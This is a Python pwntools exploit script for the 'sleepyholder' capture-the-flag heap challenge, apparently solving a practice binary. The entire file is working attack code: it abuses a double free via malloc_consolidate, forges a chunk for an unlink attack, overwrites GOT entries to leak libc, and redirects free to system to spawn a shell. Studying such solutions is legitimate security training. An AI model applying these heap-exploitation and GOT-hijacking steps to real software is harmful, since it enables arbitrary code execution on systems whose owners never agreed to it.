import pwn 
from pwn import *

context.binary = "sleepyholder_patched"
context.log_level = "DEBUG"

elf = ELF("./sleepyholder_patched")
libc = ELF("./libc.so.6")
p = elf.process()

def keepsecret(choose,content):
 p.recvuntil(b"Renew secret\n")
 p.sendline(b"1")
 p.sendlineafter(b"keep?\n",choose)
 p.sendlineafter(b"secret: ",content)

def wipesecret(choose):
 p.recvuntil(b"Renew secret\n")
 p.sendline(b"2")
 p.sendlineafter(b"wipe?\n",choose) 

def renewsecret(choose,content):
 p.recvuntil(b"Renew secret\n")
 p.sendline(b"3")
 p.sendlineafter(b"renew?\n",choose)
 p.sendafter(b"secret: ",content)


smallsecret_ptr = 0x6020e0
buf_ptr = 0x6020d0


keepsecret(b"1",b"smallsecret")
keepsecret(b"2",b"bigsecret")

#will end up in fastbin
wipesecret(b"1")

#malloc_consolidate gets trigerred as its an humoungous chunk and no match is found
#it is allocated in a newly mapped region now malloc consolidate consolidates fastbins and they end up in unsorted bin then to smallbin
#also removes prev_inuse of the large secret chunk and prev_size is now 0x30

keepsecret(b"3",b"humoungoussecret")
#double free as pointer is not nulled out in the wipe function  so the chunk is both in fastbin and smallbin
wipesecret(b"1")

#pwn.gdb.attach(p,'''
#br *400B01
#''')

#unlink to get arbitrary read as we get control over the content
fakechunk = p64(0)
fakechunk += p64(0x21) # fakechunk of size 0x21
fakechunk += p64(0x6020b8) #buf_ptr-0x18
fakechunk += p64(0x6020c0) #buf_ptr-0x10, we gain control of the content here by making it point to the address
fakechunk += p64(0x20) #prev_size of largesecret chunk overwritten as 0x20

keepsecret(b"1",fakechunk) #now it gets allocated from fastbin 
wipesecret(b"2") # freeing the largesecret chunk unlink is performed on fakechunk

#smallsecret now points to bss address, giving us control over secret pointers

#as PIE is disabled and RELRO is partial we can use atoi_got,free_got,puts_got i.e overwrite got table and get a libc leak
payload = p64(0)
payload += p64(elf.got["atoi"])
payload += p64(elf.got["puts"])
payload += p64(elf.got["free"])
payload += p64(1) * 3

#we get the libc leak after freeing the big_secret
renewsecret(b"1",payload)
renewsecret(b"1",p64(elf.plt["puts"]))
wipesecret(b"2")

#pwn.gdb.attach(p,'''
#br *400B01
#''')

p.recvline()
p.recvline()
libc_leak = u64(p.recv(6).strip().ljust(8,b"\x00"))
print(hex(libc_leak))
libc_base = libc_leak - 0x36e70 #atoi offset subtracted to get libc_base
print(hex(libc_base))
system = libc_base + 0x45380 #we calculate base and calculate system offset

renewsecret(b"1",p64(system)) #we update the smallsecret with the system offset
keepsecret(b"2",b"/bin/sh\x00") #we allocate a bigsecret chunk with /bin/sh string and get shell after we free it 
wipesecret(b"2")
p.interactive()
